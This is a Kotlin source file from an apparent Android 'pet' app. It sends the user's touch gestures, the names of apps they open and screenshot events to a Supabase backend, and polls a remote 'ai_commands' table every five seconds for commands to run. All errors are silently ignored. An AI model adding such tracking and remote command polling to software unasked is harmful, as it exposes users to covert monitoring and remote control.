package com.deepsky.pet.sync

import com.deepsky.pet.BuildConfig
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SupabaseSync(private val service: android.app.Service) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var polling = false
    private val supabaseUrl = BuildConfig.SUPABASE_URL
    private val anonKey = BuildConfig.SUPABASE_ANON_KEY

    fun logGesture(type: String, x: Int, y: Int) {
        scope.launch {
            try {
                val body = JSONObject().apply {
                    put("gesture_type", type)
                    put("x", x)
                    put("y", y)
                }
                postToSupabase("gesture_log", body)
            } catch (_: Exception) {}
        }
    }

    fun logAppUsage(packageName: String) {
        scope.launch {
            try {
                val body = JSONObject().apply {
                    put("package_name", packageName)
                    put("app_name", getAppName(packageName))
                }
                postToSupabase("app_usage", body)
            } catch (_: Exception) {}
        }
    }

    fun logScreenshot() {
        scope.launch {
            try {
                postToSupabase("screenshot_log", JSONObject().apply {
                    put("file_path", "detected_by_fileobserver")
                })
            } catch (_: Exception) {}
        }
    }

    fun pollForCommands(callback: (String) -> Unit) {
        polling = true
        scope.launch {
            while (polling && isActive) {
                try {
                    val url = URL("$supabaseUrl/rest/v1/ai_commands?executed=eq.false&order=created_at.asc&limit=1")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.setRequestProperty("apikey", anonKey)
                    conn.setRequestProperty("Authorization", "Bearer $anonKey")
                    val response = conn.inputStream.bufferedReader().readText()
                    conn.disconnect()
                    if (response.length > 2) {
                        val arr = org.json.JSONArray(response)
                        if (arr.length() > 0) {
                            val cmd = arr.getJSONObject(0)
                            val command = cmd.getString("command")
                            val cmdId = cmd.getLong("id")
                            callback(command)
                            markCommandExecuted(cmdId)
                        }
                    }
                } catch (_: Exception) {}
                delay(5000)
            }
        }
    }

    private suspend fun markCommandExecuted(id: Long) {
        try {
            val url = URL("$supabaseUrl/rest/v1/ai_commands?id=eq.$id")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "PATCH"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("apikey", anonKey)
            conn.setRequestProperty("Authorization", "Bearer $anonKey")
            conn.setRequestProperty("Prefer", "return=minimal")
            conn.doOutput = true
            conn.outputStream.use { it.write(JSONObject().apply { put("executed", true) }.toString().toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) {}
    }

    private fun postToSupabase(table: String, body: JSONObject) {
        try {
            val url = URL("$supabaseUrl/rest/v1/$table")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("apikey", anonKey)
            conn.setRequestProperty("Authorization", "Bearer $anonKey")
            conn.setRequestProperty("Prefer", "return=minimal")
            conn.doOutput = true
            conn.outputStream.use { it.write(body.toString().toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) {}
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = service.packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: Exception) { packageName }
    }

    fun stopPolling() {
        polling = false
        scope.cancel()
    }
}
